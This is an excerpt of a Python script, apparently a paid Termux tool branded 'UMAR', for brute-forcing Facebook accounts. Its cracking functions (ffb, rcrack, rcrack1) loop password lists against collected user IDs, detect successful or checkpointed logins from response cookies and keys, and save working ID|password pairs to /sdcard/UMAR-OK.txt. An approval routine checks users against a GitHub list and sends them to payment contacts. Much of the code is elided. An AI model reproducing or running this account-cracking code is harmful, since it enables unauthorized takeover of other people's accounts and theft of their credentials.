...
{+}\033[1;32mYOUTUBE        : \033[1;32MOHAMMAD UMAR\033[1;32m
{+}\033[1;32mVERSION        :\033[1;32m 0.1\033[1;32m
{+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
--------------------------------------------------
\033[1;37m[-]KINGX MR UMAR
--------------------------------------------------""")
def linex():
	print('\033[1;32m--------------------------------------------------')
def clear():
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/UMAR.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/UMAR.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/UMAR.txt\033[0;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [UMAR] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [UMAR-OK] %s | %s'%(ids,pas))
				open('/sdcard/UMAR-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[UMAR-CP] '+ids+' | '+pas+'\033[1;97m')
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [UMAR-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/UMAR-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [UMAR] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print(f'\r\x1b[1;32m [UMAR-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/MR-KINGX/MSS/blob/main/Ap.txt').text
...
{+}\033[1;32mCREATED BY     : \033[1;32Mohammad Umar\033[1;32m
(+}\033[1;32mFACEBOOK       : \033[1;32Mohammad Umar\033[1;32m
{+}\033[1;32mYOUTUBE        : \033[1;32UZ OFFICIAL YT\033[1;32m
{+}\033[1;32mSUBSCRIBERS    : \033[1;32m 2.24k\033[1;32m
{+}\033[1;32mVERSION        :\033[1;32m 0.1\033[1;32m
{+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
--------------------------------------------------
...
==================================================   """)
  ...
  os.system('xdg-open https://m.me/6420731794650784')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.                                      ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/umarwt06/APPROVAL/blob/main/APPROVAL.txt").text
    if id in httpCaht:
      ...
      print("    SUBSCRIBE MY CHENNAL AND GET APPROVAL CHENNAL LINK https://www.youtube.com/@uzofficialyt "); time.sleep(2)
      os.system('xdg-open https://m.me/6420731794650784')
      time.sleep(2)
      sys.exit()
  except:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/umarwt06/APPROVAL/blob/main/APPROVAL.txt').text
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;97m    Sorry Bro Your Token is not AprovedðŸ˜“ ")
      print("    Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://m.me/6420731794650784')
      time.sleep(2)
      os.system('xdg-open https://wa.me/+923152083002')
      time.sleep(2)
      sys.exit()
  except: 
    sys.exit()
